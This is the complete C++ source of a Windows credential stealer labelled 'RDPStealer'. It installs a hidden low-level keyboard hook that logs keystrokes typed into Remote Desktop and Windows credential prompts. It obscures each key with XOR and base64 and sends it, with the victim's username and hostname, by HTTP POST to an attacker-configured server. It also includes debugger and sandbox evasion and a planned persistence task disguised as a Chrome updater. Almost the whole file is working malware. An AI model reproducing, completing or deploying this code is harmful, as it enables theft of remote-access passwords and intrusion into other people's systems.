#include <Windows.h>
#include <lmcons.h>
#include <String>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <TlHelp32.h>
#include <WinInet.h>

using namespace std;
#pragma comment(lib, "Wininet.lib")

/*
TODO
1. Add Schedule Task
2. Add Banner
char sysPath[] = "";
char taskName[] = "GoogleChromeUpdater";
*/

// Global Varibles
LPCWSTR remoteIP = L"10.1.1.1"; // Change server IP Address
int remotePORT = 8000; // Change server PORT
LPCWSTR remoteRoute = L"/server.php";
LPCWSTR servHeader = L"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.23 Safari/537.36";
string secretKey = "MySecretKey123"; // Replace with your secret key

void colourprint(WORD backgroundColour, const char* textMessage) {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, backgroundColour);

	std::cout << textMessage << std::endl;

	SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

// Banner
void banner() {
	printf("\n");
	colourprint(FOREGROUND_GREEN, "			     Author => Gurpreet06 / RDPStealer tool\n");
}


// SandBox Evasion
BOOL checkResources() {
	SYSTEM_INFO s;
	MEMORYSTATUSEX ms;
	DWORD procNum;
	DWORD ram;

	// check number of processors
	GetSystemInfo(&s);
	procNum = s.dwNumberOfProcessors;
	if (procNum < 2) return false;

	// check RAM
	ms.dwLength = sizeof(ms);
	GlobalMemoryStatusEx(&ms);
	ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
	if (ram < 2) return false;

	return true;
}

BOOL sandboxChecker() {

	colourprint(FOREGROUND_INTENSITY, "\n[+] SandBox Evasion");

	// Debugger
	if (IsDebuggerPresent()) {
		colourprint(FOREGROUND_RED, "\t[-] Attached debugger detected [KO]");
		return -2;
	}
	colourprint(FOREGROUND_GREEN, "\t[+] No debugger is attached [OK]");

	// check resources
	if (checkResources() == false) {
		colourprint(FOREGROUND_RED, "\t[-] Possibly launched in sandbox [KO]");
		return -2;
	}
	colourprint(FOREGROUND_GREEN, "\t[+] System resources [OK]");

	return true;

}

// base64 Encode Function
const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::string base64_encode(const unsigned char* input, size_t length) {
	std::string encoded;
	encoded.reserve(((length + 2) / 3) * 4);

	for (size_t i = 0; i < length; i += 3) {
		unsigned int value = input[i] << 16;
		if (i + 1 < length) {
			value |= input[i + 1] << 8;
		}
		if (i + 2 < length) {
			value |= input[i + 2];
		}

		encoded.push_back(base64_chars[(value >> 18) & 0x3F]);
		encoded.push_back(base64_chars[(value >> 12) & 0x3F]);

		if (i + 1 < length) {
			encoded.push_back(base64_chars[(value >> 6) & 0x3F]);
		}
		else {
			encoded.push_back('=');
		}

		if (i + 2 < length) {
			encoded.push_back(base64_chars[value & 0x3F]);
		}
		else {
			encoded.push_back('=');
		}
	}

	return encoded;
}

DWORD getPIDbyProcName(const wchar_t* procName) {
	DWORD procId = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnap, &pe32)) {
			do {
				if (!_wcsicmp(procName, pe32.szExeFile)) {
					procId = pe32.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnap, &pe32));
		}
	}
	CloseHandle(hSnap);
	return procId;
}

BOOL isWindowOfProcessFocused(const wchar_t* processName) {
	// Get the PID of the process
	DWORD pid = getPIDbyProcName(processName);
	if (pid == 0) {
		return FALSE;
	}

	// Get handle to the active window
	HWND hActiveWindow = GetForegroundWindow();
	if (hActiveWindow == NULL) {
		return FALSE;
	}

	// Get PID of the active window
	DWORD activePid;
	GetWindowThreadProcessId(hActiveWindow, &activePid);

	// Check if the active window belongs to the process we're interested in
	if (activePid != pid) {
		return FALSE;
	}

	return TRUE;
}


// Function to send a POST request with data
bool sendPostRequest(const std::wstring data, const std::wstring username, const std::wstring hostname) {
	HINTERNET hInternet = InternetOpen(servHeader, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternet) {
		return 1;
	}

	HINTERNET hConnect = InternetConnect(hInternet, remoteIP, remotePORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) {
		InternetCloseHandle(hInternet);
		return 1;
	}

	HINTERNET hRequest = HttpOpenRequest(hConnect, L"POST", remoteRoute, NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
	if (!hRequest) {
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return 1;
	}

	std::wstring headers = L"Content-Type: application/json; charset=utf-8\r\n";

	// Send the HTTP request
	char JsonData[512];
	sprintf_s(JsonData, "{\"data\":\"%ls\",\"username\":\"%ls\",\"windows_name\":\"%ls\"}", data.c_str(), username.c_str(), hostname.c_str());
	HttpSendRequest(hRequest, NULL, 0, JsonData, strlen(JsonData));

	// Clean up
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
}


// Get Current Username
std::wstring getCurrentUsername() {
	wchar_t buffer[UNLEN + 1];
	DWORD bufferSize = UNLEN + 1;
	if (GetUserNameW(buffer, &bufferSize)) {
		return std::wstring(buffer);
	}
	else {
		return L"Unknown Username";
	}
}

// Get Hostname
std::wstring getWindowsHostname() {
	wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD bufferSize = MAX_COMPUTERNAME_LENGTH + 1;
	if (GetComputerNameW(buffer, &bufferSize)) {
		return std::wstring(buffer);
	}
	else {
		return L"Unknown Hostname";
	}
}

// Function to perform XOR on the input string with the secret key
string xorWithKey(const string& input, const string& key) {
	string output;
	for (size_t i = 0; i < input.size(); ++i) {
		output.push_back(input[i] ^ key[i % key.size()]);
	}
	return output;
}

// Function to decrypt the XOR-encrypted data
string xorDecrypt(const string& encryptedText, const string& key) {
	return xorWithKey(encryptedText, key);
}


// Source https://learn.microsoft.com/es-es/windows/win32/inputdev/virtual-key-codes
// VK_CODE from https://github.com/JoelDiaz93/Cpp-Keylogger/blob/main/Spy/KeyboardHook.cpp with some customization
LRESULT CALLBACK KeyboardProcess(int nCode, WPARAM wParam, LPARAM lParam) {
	static int prev;
	BOOL isLetter = 1;
	if (isWindowOfProcessFocused(L"mstsc.exe") || isWindowOfProcessFocused(L"CredentialUIBroker.exe")) {
		if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
			PKBDLLHOOKSTRUCT kbdStruct = (PKBDLLHOOKSTRUCT)lParam;
			int vkCode = kbdStruct->vkCode;
			std::string key;
			BOOL shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
			BOOL caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

			switch (vkCode)
			{
				// Alpha
				case 0x41: key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a"); break;
				case 0x42: key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b"); break;
				case 0x43: key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c"); break;
				case 0x44: key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d"); break;
				case 0x45: key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e"); break;
				case 0x46: key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f"); break;
				case 0x47: key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g"); break;
				case 0x48: key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h"); break;
				case 0x49: key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i"); break;
				case 0x4A: key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j"); break;
				case 0x4B: key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k"); break;
				case 0x4C: key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l"); break;
				case 0x4D: key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m"); break;
				case 0x4E: key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n"); break;
				case 0x4F: key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o"); break;
				case 0x50: key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p"); break;
				case 0x51: key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"); break;
				case 0x52: key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r"); break;
				case 0x53: key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s"); break;
				case 0x54: key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t"); break;
				case 0x55: key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u"); break;
				case 0x56: key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v"); break;
				case 0x57: key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w"); break;
				case 0x58: key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x"); break;
				case 0x59: key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"); break;
				case 0x5A: key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"); break;
				// Sleep
				case VK_SLEEP: key = "[SLEEP]"; break;
				// Numbers
				case VK_NUMPAD0:  key = "0"; break;
				case VK_NUMPAD1:  key = "1"; break;
				case VK_NUMPAD2:  key = "2"; break;
				case VK_NUMPAD3:  key = "3"; break;
				case VK_NUMPAD4:  key = "4"; break;
				case VK_NUMPAD5:  key = "5"; break;
				case VK_NUMPAD6:  key = "6"; break;
				case VK_NUMPAD7:  key = "7"; break;
				case VK_NUMPAD8:  key = "8"; break;
				case VK_NUMPAD9:  key = "9"; break;
				case VK_MULTIPLY: key = "*"; break;
				case VK_ADD:      key = "+"; break;
				case VK_SEPARATOR: key = "-"; break;
				case VK_SUBTRACT: key = "-"; break;
				case VK_DECIMAL:  key = "."; break;
				case VK_DIVIDE:   key = "/"; break;
				// Function Keys
				case VK_F1:  key = "[F1]"; break;
				case VK_F2:  key = "[F2]"; break;
				case VK_F3:  key = "[F3]"; break;
				case VK_F4:  key = "[F4]"; break;
				case VK_F5:  key = "[F5]"; break;
				case VK_F6:  key = "[F6]"; break;
				case VK_F7:  key = "[F7]"; break;
				case VK_F8:  key = "[F8]"; break;
				case VK_F9:  key = "[F9]"; break;
				case VK_F10:  key = "[F10]"; break;
				case VK_F11:  key = "[F11]"; break;
				case VK_F12:  key = "[F12]"; break;
				// Keys 
				case VK_NUMLOCK: key = "[NUM-LOCK]"; break;
				case VK_SCROLL:  key = "[SCROLL-LOCK]"; break;
				case VK_BACK:    key = "[BACKSPACE]"; break;
				case VK_TAB:     key = "[TAB]"; break;
				case VK_CLEAR:   key = "[CLEAR]"; break;
				case VK_RETURN:  key = "[ENTER]"; break;
				case VK_SHIFT:   key = "[SHIFT]"; break;
				case VK_CONTROL: key = "[CTRL]"; break;
				case VK_MENU:    key = "[ALT]"; break;
				case VK_PAUSE:   key = "[PAUSE]"; break;
				case VK_CAPITAL: key = "[CAP-LOCK]"; break;
				case VK_ESCAPE:  key = "[ESC]"; break;
				case VK_SPACE:   key = "[SPACE]"; break;
				case VK_PRIOR:   key = "[PAGEUP]"; break;
				case VK_NEXT:    key = "[PAGEDOWN]"; break;
				case VK_END:     key = "[END]"; break;
				case VK_HOME:    key = "[HOME]"; break;
				case VK_LEFT:    key = "[LEFT]"; break;
				case VK_UP:      key = "[UP]"; break;
				case VK_RIGHT:   key = "[RIGHT]"; break;
				case VK_DOWN:    key = "[DOWN]"; break;
				case VK_SELECT:  key = "[SELECT]"; break;
				case VK_PRINT:   key = "[PRINT]"; break;
				case VK_SNAPSHOT: key = "[PRTSCRN]"; break;
				case VK_INSERT:  key = "[INSERT]"; break;
				case VK_DELETE:  key = "[DEL]"; break;
				case VK_HELP:    key = "[HELP]"; break;
				// Combination of SHIFT + Numbers
				case 0x30:  key = shift ? "!" : "1"; break;
				case 0x31:  key = shift ? "@" : "2"; break;
				case 0x32:  key = shift ? "#" : "3"; break;
				case 0x33:  key = shift ? "$" : "4"; break;
				case 0x34:  key = shift ? "%" : "5"; break;
				case 0x35:  key = shift ? "^" : "6"; break;
				case 0x36:  key = shift ? "&" : "7"; break;
				case 0x37:  key = shift ? "*" : "8"; break;
				case 0x38:  key = shift ? "(" : "9"; break;
				case 0x39:  key = shift ? ")" : "0"; break;
				// Windows Key
				case VK_LWIN:     key = "[LEFT WIN]"; break;
				case VK_RWIN:     key = "[RIGHT WIN]"; break;
				case VK_LSHIFT:   key = "[LEFT SHIFT]"; break;
				case VK_RSHIFT:   key = "[RIGHT SHIFT]"; break;
				case VK_LCONTROL: key = "[LEFT CTRL]"; break;
				case VK_RCONTROL: key = "[RIGHT CTRL]"; break;
				case VK_LMENU:    key = "[LEFT ALT]"; break;
				case VK_RMENU:    key = "[RIGHT ALT]"; break;
				// OEM Keys with shift 
				case VK_OEM_1:      key = shift ? ":" : ";"; break;
				case VK_OEM_PLUS:   key = shift ? "+" : "="; break;
				case VK_OEM_COMMA:  key = shift ? "<" : ","; break;
				case VK_OEM_MINUS:  key = shift ? "_" : "-"; break;
				case VK_OEM_PERIOD: key = shift ? ">" : "."; break;
				case VK_OEM_2:      key = shift ? "?" : "/"; break;
				case VK_OEM_3:      key = shift ? "~" : "`"; break;
				case VK_OEM_4:      key = shift ? "{" : "["; break;
				case VK_OEM_5:      key = shift ? "|" : "\\"; break;
				case VK_OEM_6:      key = shift ? "}" : "]"; break;
				case VK_OEM_7:      key = shift ? "\"" : "'"; break;
				// Action Keys
				case VK_PLAY:       key = "[PLAY]";
				case VK_ZOOM:       key = "[ZOOM]";
				case VK_OEM_CLEAR:  key = "[CLEAR]";
				case VK_CANCEL:     key = "[CTRL-C]";

				default: key = "[UNKOWN_KEY]"; break;
			}
			string encryptedText = xorWithKey(key, secretKey);
			// Now Base64 XOR data
			const unsigned char* inputData = reinterpret_cast<const unsigned char*>(encryptedText.c_str());
			size_t inputSize = encryptedText.size();

			std::string encodedText = base64_encode(inputData, inputSize);

			// Convert the std::string to std::wstring
			std::wstring myWideStringVariable(encodedText.begin(), encodedText.end());

			// Send the POST request
			sendPostRequest(myWideStringVariable, getCurrentUsername(), getWindowsHostname());
		} else {
			// When the active window is not related to the specified processes, don't log.
			return CallNextHookEx(NULL, nCode, wParam, lParam);
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	// creating invisible window
	AllocConsole();
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	banner();
	// Simple Sandbox Evasion
	sandboxChecker();

	// More SandBox Evasion
	char *mem = NULL;
	mem = (char *)malloc(100000000);
	if (mem != NULL) {
		// Free Reserved Memory
		memset(mem, 00, 100000000);
		free(mem);

		colourprint(FOREGROUND_INTENSITY, "\n[+] Hooking Keyboard");
		// set hook
		HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProcess, 0, 0);
		colourprint(FOREGROUND_GREEN, "\t[+] Keyboard hooked [OK]");
		colourprint(FOREGROUND_INTENSITY, "\n[+] Waiting for RDP related processes\n\n");

		// wait for events
		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0) > 0) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		// delete hook
		UnhookWindowsHookEx(hook);
		return 0;
	}
}
